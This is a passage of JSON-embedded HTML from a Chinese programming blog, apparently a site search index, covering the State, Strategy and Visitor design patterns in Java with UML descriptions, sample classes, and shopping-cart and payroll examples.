product.setState(ProductState.DRAFT);</span><br><span class=\"line\">        <span class=\"comment\">//保存草稿</span></span><br><span class=\"line\">        product.request();</span><br><span class=\"line\">        <span class=\"comment\">//提交审核</span></span><br><span class=\"line\">        product.setState(ProductState.REVIEW);</span><br><span class=\"line\">        product.request();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里状态采用的是接口，实际产品状态为枚举，产品本身类和状态实现分离。各自关注自己业务。也可以吧状态转换放入环境类，通过触发不同的条件，改变当前状态。</p>\n<h3 id=\"共享状态\"><a href=\"#共享状态\" class=\"headerlink\" title=\"共享状态\"></a>共享状态</h3><p>在有些情况下，多个环境对象可能需要共享同一个状态，如果希望在系统中实现多个环境对象共享一个或多个状态对象，那么需要将这些状态对象定义为环境类的静态成员对象。<br>原理就是把状态实在为静态属性。所有对象共享。</p>\n<h3 id=\"状态模式总结\"><a href=\"#状态模式总结\" class=\"headerlink\" title=\"状态模式总结\"></a>状态模式总结</h3><p>状态模式将一个对象在不同状态下的不同行为封装在一个个状态类中，通过设置不同的状态对象可以让环境对象拥有不同的行为，而状态转换的细节对于客户端而言是透明的，方便了客户端的使用。在实际开发中，状态模式具有较高的使用频率，在工作流和游戏开发中状态模式都得到了广泛的应用，例如公文状态的转换、游戏中角色的升级等。</p>\n<p><strong>适用场景：</strong></p>\n<ul>\n<li>对象的行为依赖于它的状态，状态的改变将导致行为的变化。</li>\n<li>代码中有大量于对象有个的条件语句。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>如果在环境类中封装状态改变，可以对状态进行集中管理，而不是分散在业务中。</li>\n<li>将所有与某个状态有关的行为放到一个类中，只需要注入一个不同的状态对象即可使环境对象拥有不同的行为。</li>\n<li>允许状态转换逻辑与状态对象合成一体，而不是提供一个巨大的条件语句块，状态模式可以让我们避免使用庞大的条件语句来将业务方法和状态转换代码交织在一起。</li>\n<li>可以让多个环境对象共享一个状态对象，从而减少系统中对象的个数。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>状态模式的使用必然会增加系统中类和对象的个数，导致系统运行开销增大。</li>\n<li>状态模式的结构与实现都较为复杂，如果使用不当将导致程序结构和代码的混乱，增加系统设计的难度。</li>\n<li>状态模式对“开闭原则”的支持并不太好，增加新的状态类需要修改那些负责状态转换的源代码，否则无法转换到新增状态；而且修改某个状态类的行为也需修改对应类的源代码。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","状态模式","State Pattern"]},{"title":"Java设计模式-策略模式（Strategy Pattern）","url":"/2017/11/09/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F%EF%BC%88Strategy-Pattern%EF%BC%89/","content":"<h3 id=\"策略模式\"><a href=\"#策略模式\" class=\"headerlink\" title=\"策略模式\"></a>策略模式</h3><blockquote>\n<p>定义一系列算法类，将每一个算法封装起来，并让它们可以相互替换，策略模式让算法独立于使用它的客户而变化，也称为政策模式(Policy)。策略模式是一种对象行为型模式。</p>\n</blockquote>\n<p>在策略模式中，我们可以定义一些独立的类来封装不同的算法，每一个类封装一种具体的算法，在这里，每一个封装算法的类我们都可以称之为一种策略(Strategy)，为了保证这些策略在使用时具有一致性，一般会提供一个抽象的策略类来做规则的定义，而每种算法则对应于一个具体策略类。</p>\n<p>UML类图如下：<br><img src=\"/images/old/20171109%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-11-09%E4%B8%8B%E5%8D%884.14.50.png\"></p>\n<span id=\"more\"></span>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 环境类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Context</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">algorithm</span><span class=\"params\">(AbstractStrategy strategy)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//执行算法</span></span><br><span class=\"line\">        strategy.algorithm();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 抽象策略</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractStrategy</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//算法</span></span><br><span class=\"line\">    <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">algorithm</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 算法A</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteStrategyA</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractStrategy</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">algorithm</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;算法A&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 算法B</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteStrategyB</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractStrategy</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">algorithm</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;算法B&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Context（环境类）：环境类是使用算法的角色，它在解决某个问题（即实现某个方法）时可以采用多种策略。</li>\n<li>AbstractStrategy（抽象策略类）：它为所支持的算法声明了抽象方法，是所有策略类的父类，它可以是抽象类或具体类，也可以是接口。环境类通过抽象策略类中声明的方法在运行时调用具体策略类中实现的算法。</li>\n<li>ConcreteStrategy（具体策略类）：它实现了在抽象策略类中声明的算法，在运行时，具体策略类将覆盖在环境类中定义的抽象策略类对象，使用一种具体的算法实现某个业务处理。</li>\n</ul>\n<p>这里策略模式为了方便连接，在Context类中没有策略属性，只是Context中方法有策略的入参数，不这样做的原因是为了避免和状态模式弄混，具体实际开发可能并不是单一的设计模式，可以混合着用。</p>\n<h3 id=\"实际例子\"><a href=\"#实际例子\" class=\"headerlink\" title=\"实际例子\"></a>实际例子</h3><p>现在需要通过购物车中商品扣减活动优惠，得到实际订单价格。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 购物车</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ShoppingCart</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//购物车商品</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> List&lt;String&gt; products;</span><br><span class=\"line\">    <span class=\"comment\">//购物车价格</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer price;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">joinActivity</span><span class=\"params\">(AbstractActivity activity)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//执行计算</span></span><br><span class=\"line\">        activity.algorithm(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Integer <span class=\"title function_\">getPrice</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> price;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setPrice</span><span class=\"params\">(Integer price)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.price = price;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 抽象策略</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractActivity</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//算法</span></span><br><span class=\"line\">    <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">algorithm</span><span class=\"params\">(ShoppingCart cart)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 优惠活动A</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteActivityA</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractActivity</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">algorithm</span><span class=\"params\">(ShoppingCart cart)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;优惠活动A：计算购物车价格&quot;</span>);</span><br><span class=\"line\">        cart.setPrice(cart.getPrice() - <span class=\"number\">10</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 优惠活动B</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteActivityB</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractActivity</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">algorithm</span><span class=\"params\">(ShoppingCart cart)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;优惠活动B：计算购物车价格&quot;</span>);</span><br><span class=\"line\">        cart.setPrice(cart.getPrice() - <span class=\"number\">20</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">ShoppingCart</span> <span class=\"variable\">shoppingCart</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ShoppingCart</span>();</span><br><span class=\"line\">        <span class=\"comment\">//购物车总价100</span></span><br><span class=\"line\">        shoppingCart.setPrice(<span class=\"number\">100</span>);</span><br><span class=\"line\">        <span class=\"comment\">//可以从其他地方获取购物车中商品参加的活动</span></span><br><span class=\"line\">        shoppingCart.joinActivity(<span class=\"keyword\">new</span> <span class=\"title class_\">ConcreteActivityA</span>());</span><br><span class=\"line\">        System.out.println(shoppingCart.getPrice());</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>例子比较简单，如果设置不同的活动，对购物车的商品进行扣减。</p>\n<h3 id=\"JDK中应用\"><a href=\"#JDK中应用\" class=\"headerlink\" title=\"JDK中应用\"></a>JDK中应用</h3><p><img src=\"/images/old/20171109%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-11-09%E4%B8%8B%E5%8D%884.59.53.png\"><br>图中少了一根Container指向LayoutManager的线，Container中有个LayoutManager属性，在使用Container的时候，通过设置不同Layout展示不同布局。</p>\n<h3 id=\"策略模式总结\"><a href=\"#策略模式总结\" class=\"headerlink\" title=\"策略模式总结\"></a>策略模式总结</h3><p>在上面策略模式UML图中，如果把策略类设置为环境类的属性，那么策略模式和状态模式的UML类图是一模一样的。<br>如果在环境类中有多个方法，几乎每个方法都与当前某个属性有关，那么可以采用状态模式，如果只是一个方法有关，或者相关很少，可以采用策略模式。依据实际需求设计。<br>可参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIzNjkzMDg4\">https://www.zhihu.com/question/23693088<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p><strong>适用场景：</strong></p>\n<ul>\n<li>一个系统需要动态地在几种算法中选择一种，那么可以将这些算法封装到一个个的具体算法类中，而这些具体算法类都是一个抽象算法类的子类。</li>\n<li>一个对象有很多的行为，如果不用恰当的模式，这些行为就只好使用多重条件选择语句来实现。此时，使用策略模式，把这些行为转移到相应的具体策略类里面，就可以避免使用难以维护的多重条件选择语句。</li>\n<li>不希望客户端知道复杂的、与算法相关的数据结构，在具体策略类中封装算法与相关的数据结构，可以提高算法的保密性与安全性。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>策略模式提供了对“开闭原则”的完美支持，用户可以在不修改原有系统的基础上选择算法或行为，也可以灵活地增加新的算法或行为。</li>\n<li>策略模式提供了管理相关的算法族的办法。策略类的等级结构定义了一个算法或行为族，恰当使用继承可以把公共的代码移到抽象策略类中，从而避免重复的代码。</li>\n<li>策略模式提供了一种算法的复用机制，由于将算法单独提取出来封装在策略类中，因此不同的环境类可以方便地复用这些策略类。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>客户端必须知道所有的策略类，并自行决定使用哪一个策略类。这就意味着客户端必须理解这些算法的区别，以便适时选择恰当的算法。换言之，策略模式只适用于客户端知道所有的算法或行为的情况。</li>\n<li>策略模式将造成系统产生很多具体策略类，任何细小的变化都将导致系统要增加一个新的具体策略类。</li>\n<li>无法同时在客户端使用多个策略类，也就是说，在使用策略模式时，客户端每次只能使用一个策略类，不支持使用一个策略类完成部分功能后再使用另一个策略类来完成剩余功能的情况。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","策略模式","Strategy Pattern"]},{"title":"Java设计模式-访问者模式（Visitor Pattern）","url":"/2017/11/09/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%AE%BF%E9%97%AE%E8%80%85%E6%A8%A1%E5%BC%8F%EF%BC%88Visitor-Pattern%EF%BC%89/","content":"<h3 id=\"访问者模式\"><a href=\"#访问者模式\" class=\"headerlink\" title=\"访问者模式\"></a>访问者模式</h3><blockquote>\n<p>提供一个作用于某对象结构中的各元素的操作表示，它使我们可以在不改变各元素的类的前提下定义作用于这些元素的新操作。访问者模式是一种对象行为型模式。</p>\n</blockquote>\n<p>访问者模式是一种较为复杂的行为型设计模式，它包含访问者和被访问元素两个主要组成部分，这些被访问的元素通常具有不同的类型，且不同的访问者可以对它们进行不同的访问操作。</p>\n<p>访问者模式的目的是封装一些施加于某种数据结构元素之上的操作。一旦这些操作需要修改的话，接受这个操作的数据结构则可以保持不变。</p>\n<p>UML类图如下：<br><img src=\"/images/old/20171113%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-11-10%E4%B8%8A%E5%8D%889.55.04.png\"></p>\n<span id=\"more\"></span>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 抽象观察者</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractVisitor</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//观察子类A</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">visit</span><span class=\"params\">(ConcreteElementA element)</span>;</span><br><span class=\"line\">    <span class=\"comment\">//观察子类B</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">visit</span><span class=\"params\">(ConcreteElementB element)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;其他操作&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 实际观察者</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteVisitor</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractVisitor</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">visit</span><span class=\"params\">(ConcreteElementA element)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;处理相关操作&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">visit</span><span class=\"params\">(ConcreteElementB element)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;处理相关操作&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 抽象元素</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Element</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> List&lt;Element&gt; elements;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Element</span><span class=\"params\">(List&lt;Element&gt; elements)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.elements = elements;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> List&lt;Element&gt; <span class=\"title function_\">getElements</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> elements;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">accept</span><span class=\"params\">(AbstractVisitor visitor)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 实体</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteElementA</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Element</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ConcreteElementA</span><span class=\"params\">(List&lt;Element&gt; elements)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(elements);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">accept</span><span class=\"params\">(AbstractVisitor visitor)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;相关操作&quot;</span>);</span><br><span class=\"line\">        visitor.visit(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;相关操作&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 实体</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteElementB</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Element</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ConcreteElementB</span><span class=\"params\">(List&lt;Element&gt; elements)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(elements);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">accept</span><span class=\"params\">(AbstractVisitor visitor)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;相关操作&quot;</span>);</span><br><span class=\"line\">        visitor.visit(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;相关操作&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>AbstractVisitor（抽象访问者）：抽象访问者为对象结构中每一个具体元素类 ConcreteElement 声明一个访问操作，从这个操作的名称或参数类型可以清楚知道需要访问的具体元素的类型，具体访问者需要实现这些操作方法，定义对这些元素的访问操作。</li>\n<li>ConcreteVisitor（具体访问者）：具体访问者实现了每个由抽象访问者声明的操作，每一个操作用于访问对象结构中一种类型的元素。</li>\n<li>Element（抽象元素）：抽象元素一般是抽象类或者接口，它定义一个 accept() 方法，该方法通常以一个抽象访问者作为参数。</li>\n<li>ConcreteElement（具体元素）：具体元素实现了 accept() 方法，在 accept() 方法中调用访问者的访问方法以便完成对一个元素的操作。</li>\n</ul>\n<p>访问者模式中对象结构存储了不同类型的元素对象，以供不同访问者访问。访问者模式包括两个层次结构，一个是访问者层次结构，提供了抽象访问者和具体访问者，一个是元素层次结构，提供了抽象元素和具体元素。相同的访问者可以以不同的方式访问不同的元素，相同的元素可以接受不同访问者以不同访问方式访问。在访问者模式中，增加新的访问者无须修改原有系统，系统具有较好的可扩展性。</p>\n<h3 id=\"实际举例\"><a href=\"#实际举例\" class=\"headerlink\" title=\"实际举例\"></a>实际举例</h3><p>在一个公司中有正式员工和兼职员工，计算工资方式不一样。公司部门有财务部门和人力资源部门，财务部门查看统计员工工资，不同员工工资内容不同。人力资源部门查看统计员工工时。<br>UML类图如下：<br><img src=\"/images/old/20171113%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-11-13%E4%B8%8B%E5%8D%882.39.10.png\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 部门</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Department</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//计算</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">visit</span><span class=\"params\">(RegularEmployee employee)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">visit</span><span class=\"params\">(PartTimeEmployee employee)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 财务部门</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FaDepartment</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Department</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//计算工资</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">visit</span><span class=\"params\">(RegularEmployee employee)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">workTime</span> <span class=\"operator\">=</span> employee.getWorkTime();</span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">wages</span> <span class=\"operator\">=</span> employee.getMonthWages();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (workTime &gt; <span class=\"number\">174</span>) &#123;</span><br><span class=\"line\">            wages = wages + (workTime - <span class=\"number\">174</span>) * <span class=\"number\">10</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (workTime &lt; <span class=\"number\">174</span>) &#123;</span><br><span class=\"line\">            wages = wages - (<span class=\"number\">174</span> - workTime) * <span class=\"number\">20</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        employee.setWages(wages);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;员工：&quot;</span> + employee.getName() + <span class=\"string\">&quot; 工资结算 &quot;</span> + wages);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">visit</span><span class=\"params\">(PartTimeEmployee employee)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">wages</span> <span class=\"operator\">=</span> employee.getHourWages() * employee.getWorkTime();</span><br><span class=\"line\">        employee.setWages(wages);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;员工：&quot;</span> + employee.getName() + <span class=\"string\">&quot; 工资结算 &quot;</span> + wages);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * HR部门</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">HRDepartment</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Department</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">visit</span><span class=\"params\">(RegularEmployee employee)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">workTime</span> <span class=\"operator\">=</span> employee.getWorkTime();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;员工：&quot;</span> + employee.getName() + <span class=\"string\">&quot;工作时间 &quot;</span> + employee.getWorkTime());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (workTime &lt; <span class=\"number\">174</span>) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;员工：&quot;</span> + employee.getName() + <span class=\"string\">&quot; 本月有请假&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">visit</span><span class=\"params\">(PartTimeEmployee employee)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;员工：&quot;</span> + employee.getName() + <span class=\"string\">&quot;工作时间 &quot;</span> + employee.getWorkTime());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 公司员工</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractEmployee</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//结算工资</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer wages;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span 